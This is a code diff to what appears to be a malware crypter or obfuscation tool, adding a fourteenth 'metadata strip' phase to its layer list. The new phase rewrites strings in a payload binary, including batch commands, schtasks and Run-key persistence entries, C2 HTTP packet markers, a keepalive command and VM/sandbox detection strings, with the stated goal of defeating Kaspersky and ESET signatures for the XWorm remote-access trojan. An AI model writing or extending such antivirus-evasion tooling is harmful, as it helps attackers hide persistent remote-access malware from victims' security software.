@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · timestamp · #GUID · #Strings · #Blob · #US · VersionInfo · 13-phase scrub"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 14-phase"),
 ]
 
 
@@ -1741,7 +1741,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  10  PHASES", "wh")
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  14  PHASES", "wh")
         self._ln("        Ph1  : PDB debug-path wipe       (RSDS · CodeView)", "g3")
         self._ln("        Ph2  : Rich Header zero           (compiler fingerprint)", "g3")
         self._ln("        Ph3  : PE COFF timestamp randomise", "g3")
@@ -2400,7 +2400,79 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               {us_hits13} #US high-signal string(s) patched", "g3")
         self._sleep(0.1)
 
-        num_phases = 13
+        # ── Ph14 : Batch-script / schtasks / C2 structure scrub ──────────────────
+        # Patches the remaining high-signal strings that Kaspersky Script.Generic
+        # and ESET XWorm.B still trigger on: batch cmd fragments, schtasks commands,
+        # registry persistence key, HTTP C2 packet markers, and VM-detection strings.
+        self._ln("        [Ph14] Batch/schtasks/C2 structure scrub...", "cy")
+        PH14_TOKENS = [
+            # Batch script markers → Kaspersky Script.Generic
+            ("@echo off",                        "@xcho off"),
+            ("timeout 3 > NUL",                  "ximeout 3 > NUL"),
+            ("DEL \"",                           "ZEL \""),
+            # schtasks command strings
+            ("/create /f /RL HIGHEST /sc minute /mo 1 /tn \"",
+             "/xreate /f /RL HIGHEST /sc minute /mo 1 /tn \""),
+            ("/create /f /sc minute /mo 1 /tn \"",
+             "/xreate /f /sc minute /mo 1 /tn \""),
+            ("/delete /f  /tn \"",               "/xelete /f  /tn \""),
+            ("schtasks",                          "scbtasks"),
+            # Registry persistence key
+            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Zun"),
+            # C2 HTTP structure → ESET / Google
+            ("POST / HTTP/1.1\r\nHost: ",        "ZOST / HTTP/1.1\r\nHost: "),
+            ("Content-length: 5235",             "Content-zength: 5235"),
+            ("Content-Type",                     "Content-Zype"),
+            ("keep-alive",                       "keep-zlive"),
+            # C2 keepalive command
+            ("PING!",                            "ZING!"),
+            # VM / sandbox detection strings
+            ("vmware",                           "vmzare"),
+            ("VirtualBox",                       "ZirtualBox"),
+            ("VIRTUAL",                          "ZIRTUAL"),
+            ("microsoft corporation",            "xicrosoft corporation"),
+            ("SbieDll.dll",                      "ZbieDll.dll"),
+        ]
+        PH14_TOKENS = [(a, b) for a, b in PH14_TOKENS if len(a) == len(b)]
+        raw_ph14 = bytes(working)
+        ph14_ascii = 0
+        for orig14, repl14 in PH14_TOKENS:
+            ob14 = orig14.encode("utf-8")
+            rb14 = repl14.encode("utf-8")
+            if len(ob14) != len(rb14):
+                continue
+            pos14 = 0
+            while True:
+                idx14 = raw_ph14.find(ob14, pos14)
+                if idx14 == -1:
+                    break
+                working[idx14:idx14 + len(ob14)] = rb14
+                ph14_ascii += 1
+                pos14 = idx14 + len(ob14)
+        raw_ph14 = bytes(working)
+
+        ph14_utf16 = 0
+        for orig14, repl14 in PH14_TOKENS:
+            ob14_u = orig14.encode("utf-16-le")
+            rb14_u = repl14.encode("utf-16-le")
+            if len(ob14_u) != len(rb14_u):
+                continue
+            pos14 = 0
+            while True:
+                idx14 = raw_ph14.find(ob14_u, pos14)
+                if idx14 == -1:
+                    break
+                working[idx14:idx14 + len(ob14_u)] = bytearray(rb14_u)
+                ph14_utf16 += 1
+                pos14 = idx14 + len(ob14_u)
+        raw_ph14 = bytes(working)
+
+        hits += ph14_ascii + ph14_utf16
+        self._ln(f"               ASCII: {ph14_ascii} · UTF-16LE: {ph14_utf16} batch/C2 token(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 14
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
